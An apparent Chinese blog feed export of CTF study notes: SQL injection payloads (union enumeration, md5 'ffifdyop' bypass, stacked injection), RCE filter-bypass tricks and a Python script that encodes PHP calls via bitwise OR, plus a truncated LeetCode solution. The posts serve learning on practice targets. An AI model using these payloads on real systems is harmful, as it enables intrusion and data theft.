<h2 id="7、2019极客-RCEME"><a href="#7、2019极客-RCEME" class="headerlink" title="7、2019极客-RCEME"></a>7、2019极客-RCEME</h2><h2 id="8、N1BOOK-SSRF（PHP-url解析漏洞）"><a href="#8、N1BOOK-SSRF（PHP-url解析漏洞）" class="headerlink" title="8、N1BOOK-SSRF（PHP url解析漏洞）"></a>8、N1BOOK-SSRF（PHP url解析漏洞）</h2><h2 id="9、SUCTF-upload-labs2"><a href="#9、SUCTF-upload-labs2" class="headerlink" title="9、SUCTF-upload labs2"></a>9、SUCTF-upload labs2</h2><h2 id="10、BJDCTF-easy-md5（SQL注入md5解析）"><a href="#10、BJDCTF-easy-md5（SQL注入md5解析）" class="headerlink" title="10、BJDCTF-easy_md5（SQL注入md5解析）"></a>10、BJDCTF-easy_md5（SQL注入md5解析）</h2><p>这道题一打开，发现啥都没有，抓个包，发现在<code>response</code>的头里有提示。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_12.png" alt=""></p>
<p>这里的提示的已经非常明显，大致的原理就是</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">md5(&#x27;ffifdyop&#x27;) = 276F722736C95D99E921722CF9ED621C</span><br></pre></td></tr></table></figure>
<p>这里就有一个非常牛逼的骚点，<code>mysql</code>会把这个加密后的<code>md5</code>字符串理解成为16进制字符串</p>
<p>这样就能查询字符串转化为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;6xxxxx&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>这样就成功进去了，后面的<code>md5</code>操作比较常规了，这里就不说了。</p>
<h3 id="11、2022DAS-防疫挑战赛（）"><a href="#11、2022DAS-防疫挑战赛（）" class="headerlink" title="11、2022DAS 防疫挑战赛（）"></a>11、2022DAS 防疫挑战赛（）</h3>]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>buuoj</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF-warmup-目录穿越</title>
    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
    <content><![CDATA[<h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
<p>我们首先来看一下</p>
<span id="more"></span>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入笔记</title>
    <url>/2022/03/31/blog0002-SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="零、写在前面"><a href="#零、写在前面" class="headerlink" title="零、写在前面"></a>零、写在前面</h2><p>这一篇的学习讲解一些基本的注入原理主要结合<code>sqli-labs</code>的靶场，同时也会结合<code>sqlmap</code>的具体使用来说明。</p>
<span id="more"></span>
<h2 id="一、报错注入"><a href="#一、报错注入" class="headerlink" title="一、报错注入"></a>一、报错注入</h2><p>当你在前端输入执行<code>sql</code>注入语句，后端执行之后，把错误信息返回给了前端，从而使你获取到了数据库的信息。</p>
<h2 id="二、联合注入"><a href="#二、联合注入" class="headerlink" title="二、联合注入"></a>二、联合注入</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名<span class="number">-2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,&#123;column_name&#125;,<span class="number">0x5c</span>,&#123;colunm_name&#125;) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;);</span><br><span class="line"># 注意， 爆破内容时我们要考虑引号的问题</span><br><span class="line"># 补一个爆破内容的例子：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,id,<span class="number">0x5c</span>,name) <span class="keyword">from</span> whistle.user);</span><br></pre></td></tr></table></figure>
<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
<p>大致的原理和RCE中的管道运算符注入一样。</p>
<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE中的绕过总结（持续更新中）</title>
    <url>/2021/09/14/blog0001-rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="一、空格绕过"><a href="#一、空格绕过" class="headerlink" title="一、空格绕过"></a>一、空格绕过</h2><h3 id="1、URL编码绕过"><a href="#1、URL编码绕过" class="headerlink" title="1、URL编码绕过"></a>1、URL编码绕过</h3><p>空格在URL编码中为%20</p>
<p>当空格被过滤时，我们可以使用%09（tab）或者%0a（回车）绕过</p>
<p>Attention : 使用%0a时考虑是代码执行还是命令执行,如PHP中调用system()函数，如果使用%0a无法实现效果]</p>
<span id="more"></span>
<h3 id="2、shell变量绕过"><a href="#2、shell变量绕过" class="headerlink" title="2、shell变量绕过"></a>2、shell变量绕过</h3><p>在Linux bash中，我们可以使用shell中预设的变量来绕过空格</p>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">tac$</span><span class="bash">&#123;IFS&#125;flag.php</span></span><br><span class="line"><span class="meta">tac$</span><span class="bash">IFS<span class="variable">$1flag</span>.php</span></span><br><span class="line"><span class="meta">tac$</span><span class="bash">IFS<span class="variable">$9flag</span>.php</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意，kali默认为zsh环境，此时效果不一定成功</span></span><br></pre></td></tr></table></figure>
<h3 id="3、其他特殊符号替代"><a href="#3、其他特殊符号替代" class="headerlink" title="3、其他特殊符号替代"></a>3、其他特殊符号替代</h3><p>当上述方法被禁止的时候，我们可以考虑使用shell特殊符号</p>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac&lt;flag.php #代替 tac flag.php</span><br><span class="line">tac&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>
<h2 id="二、敏感词绕过"><a href="#二、敏感词绕过" class="headerlink" title="二、敏感词绕过"></a>二、敏感词绕过</h2><h3 id="1、通配符绕过"><a href="#1、通配符绕过" class="headerlink" title="1、通配符绕过"></a>1、通配符绕过</h3><p>Linux bash常见的通配符：</p>
<ul>
<li>* ：匹配任意个字符</li>
<li>？：匹配单个字符</li>
</ul>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">绕过简单的敏感词，实现文件的打开操作</span></span><br><span class="line">tac fla*  #</span><br><span class="line">tac fla?.php  #</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">字母被过滤时</span></span><br><span class="line">???/????64 ????.??? </span><br><span class="line"><span class="meta">#</span><span class="bash">等价于实现了 bin/base64 flag.php</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">参考案例(题源 ctfshow web入门 55)</span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span></span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2、shell字符串拼接"><a href="#2、shell字符串拼接" class="headerlink" title="2、shell字符串拼接"></a>2、shell字符串拼接</h3><p>Linux中shell字符串是可以拼接的,并且不需要额外的运算符。</p>
<p>那么我们可以得到以下3条等价的语句。</p>
<p>需要注意的是，如果第3条语句没有加上${}的分隔，将会被系统认为是$ag，这样得不到正确的结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac /flag.png</span><br><span class="line">a=ag.png;tac /fl$a</span><br><span class="line">a=ag.pn;tac /fl$&#123;a&#125;g</span><br></pre></td></tr></table></figure>
<p>有了以上的知识，我们可以构造更为简单的payload,我们不需要引入额外的shell变量，直接利用“”这样的空字符串来实现拼接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac /fl&quot;&quot;ag.png</span><br><span class="line">tac /fla&#x27;&#x27;g.png</span><br></pre></td></tr></table></figure>
<h3 id="3、shell反斜杠转义"><a href="#3、shell反斜杠转义" class="headerlink" title="3、shell反斜杠转义"></a>3、shell反斜杠转义</h3><p>shell中反斜杠是去除转移字符的特殊含义，这个与大多数的语言类似。</p>
<p>当反斜杠后接正常字符，在shell中相当于不处理。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 以下两个句子在shell测试，发现两者输出相同</span></span><br><span class="line">echo flag.php</span><br><span class="line">echo fla\g.php</span><br></pre></td></tr></table></figure>
<h3 id="3、管道运算符的运用"><a href="#3、管道运算符的运用" class="headerlink" title="3、管道运算符的运用"></a>3、管道运算符的运用</h3><p><a href="https://blog.csdn.net/weixin_43460822/article/details/101622147">Linux 的 管道运算符+%0a</a></p>
<h3 id="4、文件读取"><a href="#4、文件读取" class="headerlink" title="4、文件读取"></a>4、文件读取</h3><p><a href="https://blog.csdn.net/JC_xxx/article/details/108921607">Linux 的文件读取指令 + grep</a></p>
<h3 id="5、eval逃逸"><a href="#5、eval逃逸" class="headerlink" title="5、eval逃逸"></a>5、eval逃逸</h3><p>这个其实用处不是很大，大意如下，也就是将对c的过滤转移出去，这样可以在a上实现rce</p>
<p>（这个思路还是很有意思的，2021极客大挑战反弹shell那道题就可以利用类似的思路开两个端口来实现真正的反弹shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">post: </span><br><span class="line">c = <span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);</span><br><span class="line">a = system(<span class="string">&#x27;ls&#x27;</span>);    </span><br></pre></td></tr></table></figure>
<h2 id="三、位运算绕过"><a href="#三、位运算绕过" class="headerlink" title="三、位运算绕过"></a>三、位运算绕过</h2><p>当字母和数字被过滤的时候，我们有的时候也可以考虑用PHP字符串位运算绕过的形式。</p>
<p>在PHP中”abc”|”abc”会将两个字符串转成ASCII二进制形式，如0x616263|0x616263 = 0x616263 </p>
<p>例题ctfshow(web 41)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>分析题目我们发现可以 | 运算符以及引号没有被过滤，因此我们可以选择使用位运算绕过。</p>
<p>我们要注意的是，如果我们只是将system(‘ls’)通过位运算实现，这样的话输出的结果只会是 system(‘ls’), PHP会在eval中计算得到的字符串，但是并不会执行这样的语句。等价于，eval执行的是echo(“system(‘ls’)”);</p>
<p>要在PHP中利用字符串实现调用函数。我们可以先做个小实验：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);            <span class="comment">//错误信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>,<span class="number">1</span>);    <span class="comment">//php启动错误信息</span></span><br><span class="line">error_reporting(-<span class="number">1</span>);                    <span class="comment">//打印出所有的 错误信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>&#123; </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;Error:&lt;/b&gt; [<span class="subst">$errno</span>] <span class="subst">$errstr</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//set error handler</span></span><br><span class="line">set_error_handler(<span class="string">&quot;customError&quot;</span>);</span><br><span class="line"><span class="variable">$c</span> = (<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="string">&quot;(&#x27;\x13\x19\x13\x14\x05\x0d&#x27;|&#x27;\x60\x60\x60\x60\x60\x60&#x27;)(&#x27;\x0c\x13&#x27;|&#x27;\x60\x60&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>当利用eval执行时，$d从字符串变为执行语句（直观点的理解就是最外层的引号没了），等价于$c。</p>
<p>最后附上py脚本（如果只是一次的话，没必要生成文件，直接生成字典就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formDictionary</span>():</span></span><br><span class="line">    ch_sum = []</span><br><span class="line">    <span class="comment"># 找到符合条件的字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        ch = <span class="built_in">chr</span>(i)</span><br><span class="line">        re1 = re.match(<span class="string">r&quot;[0-9]|[a-z]|[A-Z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&quot;</span>,ch)</span><br><span class="line">        <span class="keyword">if</span>(re1 == <span class="literal">None</span>):</span><br><span class="line">            ch_sum.append(ch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dic.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">        result= []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ch_sum:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> ch_sum:</span><br><span class="line">                x = <span class="built_in">ord</span>(i)|<span class="built_in">ord</span>(j)</span><br><span class="line">                <span class="keyword">if</span>(x&gt;=<span class="number">32</span> <span class="keyword">and</span> x&lt;=<span class="number">126</span> <span class="keyword">and</span> (<span class="keyword">not</span> x <span class="keyword">in</span> result)):</span><br><span class="line">                    result.append(x)</span><br><span class="line">                    <span class="comment">#warning 这可能导致无法构造出\t,字符串split</span></span><br><span class="line">                    fout.write(<span class="string">&quot;%&#123;:0&gt;2x&#125;\t%&#123;:0&gt;2x&#125;\t&#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(i),<span class="built_in">ord</span>(j),<span class="built_in">chr</span>(x)))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formStr</span>(<span class="params">s</span>):</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    dic = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dic.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">for</span> lines <span class="keyword">in</span> fin:</span><br><span class="line">            elem = (lines.split(<span class="string">&#x27;\t&#x27;</span>))</span><br><span class="line">            dic[elem[-<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)] = (elem[<span class="number">0</span>],elem[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span>(dic.get(i)!=<span class="literal">None</span>):</span><br><span class="line">                s1 += dic[i][<span class="number">0</span>]</span><br><span class="line">                s2 += dic[i][<span class="number">1</span>]</span><br><span class="line">               <span class="comment"># print(&quot;&#123;&#125; : &#123;&#125;|&#123;&#125;&quot;.format(i,dic[i][0],dic[i][1]))</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sys.exit(<span class="string">&quot;No answer&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;(\&#x27;&quot;</span>+s1+<span class="string">&quot;\&#x27;|\&#x27;&quot;</span>+s2+<span class="string">&quot;\&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    formDictionary()</span><br><span class="line">    s0 = <span class="built_in">input</span>(<span class="string">&quot;function : &quot;</span>)</span><br><span class="line">    s1 = <span class="built_in">input</span>(<span class="string">&quot;argc : &quot;</span>)</span><br><span class="line">    s0_encode= formStr(s0)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s1 == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        s1_encode = <span class="string">&quot;()&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s1_encode=formStr(s1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># warning : eval()需要补充 -&gt; ;</span></span><br><span class="line">    <span class="built_in">print</span>(s0_encode+s1_encode + <span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># data=&#123;</span></span><br><span class="line">    <span class="comment">#    &#x27;cmd&#x27;:urllib.parse.unquote(s0_encode + s1_encode + &quot;;&quot;)		#注意使用quote</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># proxies = &#123;</span></span><br><span class="line">    <span class="comment">#     &quot;http&quot; : &quot;127.0.0.1:8080&quot;</span></span><br><span class="line">    <span class="comment">#     #&quot;http:&quot; : &quot;127.0.0.1:8080&quot;</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># warning: 采用字符串的方式避免urlencode</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data1 = <span class="string">&quot;cmd=&quot;</span> + s0_encode + s1_encode + <span class="string">&quot;;&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(url=<span class="string">&quot;http://localhost/www.mytest.cn/&quot;</span>,data=data1,headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>rce</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello world!</title>
    <url>/2022/01/16/blog0000-hello-world/</url>
    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
<span id="more"></span>
<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
]]></content>
      <tags>
        <tag>preface</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-分治-为运算表达式设计优先级</title>
    <url>/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/</url>
    <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给你一个由数字和运算符组成的字符串 <code>expression</code> ，按不同优先级组合数字和运算符，计算并返回所有可能组合的结果。你可以 <strong>按任意顺序</strong> 返回答案</p>
<span id="more"></span>
<p><strong>示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：expression = &quot;2-1-1&quot;</span><br><span class="line">输出：[0,2]</span><br><span class="line">解释：</span><br><span class="line">((2-1)-1) = 0 </span><br><span class="line">(2-(1-1)) = 2</span><br><span class="line"></span><br><span class="line">输入：expression = &quot;2*3-4*5&quot;</span><br><span class="line">输出：[-34,-14,-10,-10,10]</span><br><span class="line">解释：</span><br><span class="line">(2*(3-(4*5))) = -34 </span><br><span class="line">((2*3)-(4*5)) = -14 </span><br><span class="line">((2*(3-4))*5) = -10 </span><br><span class="line">(2*((3-4)*5)) = -10 </span><br><span class="line">(((2*3)-4)*5) = 10</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>1 &lt;= expression.length &lt;= 20</li>
<li>输入表达式中的所有整数值在范围 [0, 99] </li>
<li>expression 由数字和算符 ‘+’、’-‘ 和 ‘*’ 组成。</li>
</ul>
<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><p>最开始，我的处理思路是对于一个expression，我们可以分解一个数字和一个剩余的表达式。将（2*3-4*5）分解为</p>
<script type="math/tex; mode=display">
2*(3-4*5)\\
2*3-(4*5)</script><p>但显然这样是不对的，我们需要注意的是，这样子我们就没有回头路了，简单的理解就是我们无法处理：</p>
<script type="math/tex; mode=display">
((2*3)-4)*5</script><p>但是一旦意识到我们存在这样的错误时，我们发现其实将我们前面的思路改进一下，当我们计算出<script type="math/tex">2*3</script>时，我们就把式子转化为$(6-4)*5$，这又是我们之前处理的范围了。</p>
<p>于是，我们将我们之前的思路扭转一下，对于任意的表达式$c$，我们可以将其拆分为$a$ op $b$，这样我们就得到了分治处理的思路。</p>
<p><strong>终止条件为：当表达式不存在操作符时，即表达式为数值时，我们直接返回数值本身</strong></p>
<p>我的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//计算表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2 , <span class="keyword">char</span> op)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span>(op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> num1 + num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> num1 - num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> num1 * num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">diffWaysToCompute</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = expression.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; v3;</span><br><span class="line">        <span class="keyword">int</span> op_flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> op = expression[i];</span><br><span class="line">            <span class="keyword">if</span>(!(op == <span class="string">&#x27;+&#x27;</span> || op == <span class="string">&#x27;-&#x27;</span> || op ==<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            op_flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//计算前半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v1 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>(),expression.<span class="built_in">begin</span>() + i));</span><br><span class="line">            <span 